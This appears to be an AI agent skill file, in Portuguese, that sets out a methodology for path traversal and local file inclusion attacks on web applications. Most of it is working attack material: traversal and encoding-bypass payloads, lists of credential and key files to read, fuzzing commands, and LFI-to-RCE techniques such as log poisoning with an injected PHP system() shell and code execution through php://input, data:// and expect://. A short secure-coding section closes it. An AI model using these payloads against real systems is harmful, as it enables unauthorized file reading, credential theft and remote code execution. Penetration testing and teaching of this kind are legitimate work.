---
name: Teste de Traversal de Caminho de Arquivo
description: Esta habilidade deve ser usada quando o usuário solicita "testar travessia de diretório", "explorar vulnerabilidades de traversal de caminho", "ler arquivos arbitrários através de aplicações web", "encontrar vulnerabilidades de LFI" ou "acessar arquivos fora da raiz web". Fornece metodologias abrangentes de ataque e teste de traversal de caminho de arquivo.
metadata:
  author: zebbern
  version: "1.1"
---

# Teste de Traversal de Caminho de Arquivo

## Propósito

Identificar e explorar vulnerabilidades de traversal de caminho de arquivo (traversal de diretório) que permitem aos atacantes ler arquivos arbitrários no servidor, potencialmente incluindo arquivos de configuração sensíveis, credenciais e código-fonte. Esta vulnerabilidade ocorre quando entradas controláveis pelo usuário são passadas para APIs do sistema de arquivos sem validação adequada.

## Pré-requisitos

### Ferramentas Necessárias
- Navegador web com ferramentas de desenvolvedor
- Burp Suite ou OWASP ZAP
- cURL para testar payloads
- Listas de palavras para automação
- ffuf ou wfuzz para fuzzing

### Conhecimento Necessário
- Estrutura de requisição/resposta HTTP
- Layout do sistema de arquivos Linux e Windows
- Arquitetura de aplicações web
- Compreensão básica de APIs de arquivo

## Resultados e Entregas

1. **Relatório de Vulnerabilidade** - Pontos de traversal identificados e severidade
2. **Prova de Exploração** - Conteúdo de arquivos extraídos
3. **Avaliação de Impacto** - Arquivos acessíveis e exposição de dados
4. **Orientação de Remediação** - Recomendações de codificação segura

## Fluxo de Trabalho Principal

### Fase 1: Entendendo Path Traversal

Path traversal ocorre quando aplicações usam entrada do usuário para construir caminhos de arquivo:

```php
// Exemplo de código PHP vulnerável
$template = "blue.php";
if (isset($_COOKIE['template']) && !empty($_COOKIE['template'])) {
    $template = $_COOKIE['template'];
}
include("/home/user/templates/" . $template);
```

Princípio de ataque:
- Sequência `../` move um diretório para cima
- Encadear múltiplas sequências para alcançar a raiz
- Acessar arquivos fora do diretório pretendido

Impacto:
- **Confidencialidade** - Ler arquivos sensíveis
- **Integridade** - Escrever/modificar arquivos (em alguns casos)
- **Disponibilidade** - Deletar arquivos (em alguns casos)
- **Execução de Código** - Se combinado com upload de arquivo ou envenenamento de log

### Fase 2: Identificando Pontos de Traversal

Mapeie a aplicação para operações potenciais com arquivos:

```bash
# Parâmetros que frequentemente lidam com arquivos
?file=
?path=
?page=
?template=
?filename=
?doc=
?document=
?folder=
?dir=
?include=
?src=
?source=
?content=
?view=
?download=
?load=
?read=
?retrieve=
```

Funcionalidades vulneráveis comuns:
- Carregamento de imagem: `/image?filename=23.jpg`
- Seleção de template: `?template=blue.php`
- Downloads de arquivo: `/download?file=report.pdf`
- Visualizadores de documento: `/view?doc=manual.pdf`
- Mecanismos de include: `?page=about`

### Fase 3: Técnicas Básicas de Exploração

#### Path Traversal Simples

```bash
# Traversal básico para Linux
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd

# Traversal para Windows
..\..\..\windows\win.ini
..\..\..\..\windows\system32\drivers\etc\hosts

# Codificação URL
..%2F..%2F..%2Fetc%2Fpasswd
..%252F..%252F..%252Fetc%252Fpasswd  # Dupla codificação

# Testar payloads com curl
curl "http://target.com/image?filename=../../../etc/passwd"
curl "http://target.com/download?file=....//....//....//etc/passwd"
```

#### Injeção de Caminho Absoluto

```bash
# Caminho absoluto direto (Linux)
/etc/passwd
/etc/shadow
/etc/hosts
/proc/self/environ

# Caminho absoluto direto (Windows)
C:\windows\win.ini
C:\windows\system32\drivers\etc\hosts
C:\boot.ini
```

### Fase 4: Técnicas de Bypass

#### Bypass de Sequências de Traversal Stripped

```bash
# Quando ../ é removido uma vez
....//....//....//etc/passwd
....\/....\/....\/etc/passwd

# Traversal aninhado
..././..././..././etc/passwd
....//....//etc/passwd

# Codificação mista
..%2f..%2f..%2fetc/passwd
%2e%2e/%2e%2e/%2e%2e/etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

#### Bypass de Validação de Extensão

```bash
# Injeção de null byte (versões antigas de PHP)
../../../etc/passwd%00.jpg
../../../etc/passwd%00.png

# Truncamento de caminho
../../../etc/passwd...............................

# Dupla extensão
../../../etc/passwd.jpg.php
```

#### Bypass de Validação de Diretório Base

```bash
# Quando o caminho deve começar com diretório esperado
/var/www/images/../../../etc/passwd

# Caminho esperado seguido de traversal
images/../../../etc/passwd
```

#### Bypass de Filtros Blacklist

```bash
# Codificação Unicode/UTF-8
..%c0%af..%c0%af..%c0%afetc/passwd
..%c1%9c..%c1%9c..%c1%9cetc/passwd

# Codificação UTF-8 alongada
%c0%2e%c0%2e%c0%af

# Variações de codificação URL
%2e%2e/
%2e%2e%5c
..%5c
..%255c

# Variações de caso (Windows)
....\\....\\etc\\passwd
```

### Fase 5: Arquivos Alvo em Linux

Arquivos de alto valor para atacar:

```bash
# Arquivos de sistema
/etc/passwd           # Contas de usuário
/etc/shadow           # Hashes de senha (apenas root)
/etc/group            # Informações de grupo
/etc/hosts            # Mapeamento de hosts
/etc/hostname         # Nome do host do sistema
/etc/issue            # Banner do sistema

# Arquivos SSH
/root/.ssh/id_rsa           # Chave privada root
/root/.ssh/authorized_keys  # Chaves autorizadas
/home/<user>/.ssh/id_rsa    # Chaves privadas do usuário
/etc/ssh/sshd_config        # Configuração SSH

# Arquivos de servidor web
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf
/etc/apache2/sites-enabled/000-default.conf
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log

# Arquivos de aplicação
/var/www/html/config.php
/var/www/html/wp-config.php
/var/www/html/.htaccess
/var/www/html/web.config

# Informações de processo
/proc/self/environ      # Variáveis de ambiente
/proc/self/cmdline      # Linha de comando do processo
/proc/self/fd/0         # Descritores de arquivo
/proc/version           # Versão do kernel

# Configs de aplicação comum
/etc/mysql/my.cnf
/etc/postgresql/*/postgresql.conf
/opt/lampp/etc/httpd.conf
```

### Fase 6: Arquivos Alvo em Windows

Alvos específicos do Windows:

```bash
# Arquivos de sistema
C:\windows\win.ini
C:\windows\system.ini
C:\boot.ini
C:\windows\system32\drivers\etc\hosts
C:\windows\system32\config\SAM
C:\windows\repair\SAM

# Arquivos IIS
C:\inetpub\wwwroot\web.config
C:\inetpub\logs\LogFiles\W3SVC1\

# Arquivos de configuração
C:\xampp\apache\conf\httpd.conf
C:\xampp\mysql\data\mysql\user.MYD
C:\xampp\passwords.txt
C:\xampp\phpmyadmin\config.inc.php

# Arquivos do usuário
C:\Users\<user>\.ssh\id_rsa
C:\Users\<user>\Desktop\
C:\Documents and Settings\<user>\
```

### Fase 7: Teste Automatizado

#### Usando Burp Suite

```
1. Capturar requisição com parâmetro de arquivo
2. Enviar para Intruder
3. Marcar valor do parâmetro de arquivo como posição de payload
4. Carregar lista de palavras de path traversal
5. Iniciar ataque
6. Filtrar respostas por tamanho/conteúdo para sucesso
```

#### Usando ffuf

```bash
# Fuzzing básico de traversal
ffuf -u "http://target.com/image?filename=FUZZ" \
     -w /usr/share/wordlists/traversal.txt \
     -mc 200

# Fuzzing com codificação
ffuf -u "http://target.com/page?file=FUZZ" \
     -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
     -mc 200,500 -ac
```

#### Usando wfuzz

```bash
# Traversar para /etc/passwd
wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
      --hc 404 \
      "http://target.com/index.php?file=FUZZ"

# Com headers/cookies
wfuzz -c -z file,traversal.txt \
      -H "Cookie: session=abc123" \
      "http://target.com/load?path=FUZZ"
```

### Fase 8: Escalação de LFI para RCE

#### Envenenamento de Log

```bash
# Injetar código PHP em logs
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# Incluir arquivo de log Apache
curl "http://target.com/page?file=../../../var/log/apache2/access.log&cmd=id"

# Incluir auth.log (SSH)
# Primeiro: ssh '<?php system($_GET["cmd"]); ?>'@target.com
curl "http://target.com/page?file=../../../var/log/auth.log&cmd=whoami"
```

#### Proc/self/environ

```bash
# Injetar via User-Agent
curl -A "<?php system('id'); ?>" \
     "http://target.com/page?file=/proc/self/environ"

# Com parâmetro de comando
curl -A "<?php system(\$_GET['c']); ?>" \
     "http://target.com/page?file=/proc/self/environ&c=whoami"
```

#### Exploração de PHP Wrapper

```bash
# php://filter - Ler código-fonte como base64
curl "http://target.com/page?file=php://filter/convert.base64-encode/resource=config.php"

# php://input - Executar dados POST como PHP
curl -X POST -d "<?php system('id'); ?>" \
     "http://target.com/page?file=php://input"

# data:// - Executar PHP inline
curl "http://target.com/page?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==&c=id"

# expect:// - Executar comandos de sistema
curl "http://target.com/page?file=expect://id"
```

### Fase 9: Metodologia de Teste

Abordagem estruturada de teste:

```bash
# Etapa 1: Identificar parâmetros potenciais
# Procurar por funcionalidade relacionada a arquivo

# Etapa 2: Testar traversal básico
../../../etc/passwd

# Etapa 3: Testar variações de codificação
..%2F..%2F..%2Fetc%2Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Etapa 4: Testar técnicas de bypass
....//....//....//etc/passwd
..;/..;/..;/etc/passwd

# Etapa 5: Testar caminhos absolutos
/etc/passwd

# Etapa 6: Testar com null bytes (legado)
../../../etc/passwd%00.jpg

# Etapa 7: Tentar exploração de wrapper
php://filter/convert.base64-encode/resource=index.php

# Etapa 8: Tentar envenenamento de log para RCE
```

### Fase 10: Medidas de Prevenção

Práticas de codificação segura:

```php
// PHP: Use basename() para remover caminhos
$filename = basename($_GET['file']);
$path = "/var/www/files/" . $filename;

// PHP: Validar contra whitelist
$allowed = ['report.pdf', 'manual.pdf', 'guide.pdf'];
if (in_array($_GET['file'], $allowed)) {
    include("/var/www/files/" . $_GET['file']);
}

// PHP: Canonicalizar e verificar caminho base
$base = "/var/www/files/";
$realBase = realpath($base);
$userPath = $base . $_GET['file'];
$realUserPath = realpath($userPath);

if ($realUserPath && strpos($realUserPath, $realBase) === 0) {
    include($realUserPath);
}
```

```python
# Python: Use os.path.realpath() e validação
import os

def safe_file_access(base_dir, filename):
    # Resolver para caminho absoluto
    base = os.path.realpath(base_dir)
    file_path = os.path.realpath(os.path.join(base, filename))
    
    # Verificar se arquivo está dentro do diretório base
    if file_path.startswith(base):
        return open(file_path, 'r').read()
    else:
        raise Exception("Acesso negado")
```

## Referência Rápida

### Payloads Comuns

| Payload | Alvo |
|---------|------|
| `../../../etc/passwd` | Arquivo de senha Linux |
| `..\..\..\..\windows\win.ini` | Arquivo INI Windows |
| `....//....//....//etc/passwd` | Bypass de filtro simples |
| `/etc/passwd` | Caminho absoluto |
| `php://filter/convert.base64-encode/resource=config.php` | Código-fonte |

### Arquivos Alvo

| SO | Arquivo | Propósito |
|----|---------|-----------|
| Linux | `/etc/passwd` | Contas de usuário |
| Linux | `/etc/shadow` | Hashes de senha |
| Linux | `/proc/self/environ` | Variáveis de ambiente |
| Windows | `C:\windows\win.ini` | Configuração de sistema |
| Windows | `C:\boot.ini` | Configuração de boot |
| Web | `wp-config.php` | Credenciais de BD do WordPress |

### Variantes de Codificação

| Tipo | Exemplo |
|------|---------|
| Codificação URL | `%2e%2e%2f` = `../` |
| Dupla Codificação | `%252e%252e%252f` = `../` |
| Unicode | `%c0%af` = `/` |
| Null Byte | `%00` |

## Restrições e Limitações

### Restrições de Permissão
- Não é possível ler arquivos que o usuário da aplicação não consegue acessar
- Arquivo shadow requer privilégios de root
- Muitos arquivos possuem permissões restritivas

### Restrições de Aplicação
- Validação de extensão pode limitar tipos de arquivo
- Validação de caminho base pode restringir escopo
- WAF pode bloquear payloads comuns

### Considerações de Teste
- Respeitar escopo autorizado
- Evitar acessar dados genuinamente sensíveis
- Documentar todo o acesso bem-sucedido

## Resolução de Problemas

| Problema | Soluções |
|----------|----------|
| Sem diferença de resposta | Tentar codificação, traversal cego, arquivos diferentes |
| Payload bloqueado | Usar variantes de codificação, sequências aninhadas, variações de caso |
| Não é possível escalar para RCE | Verificar logs, PHP wrappers, upload de arquivo, envenenamento de sessão |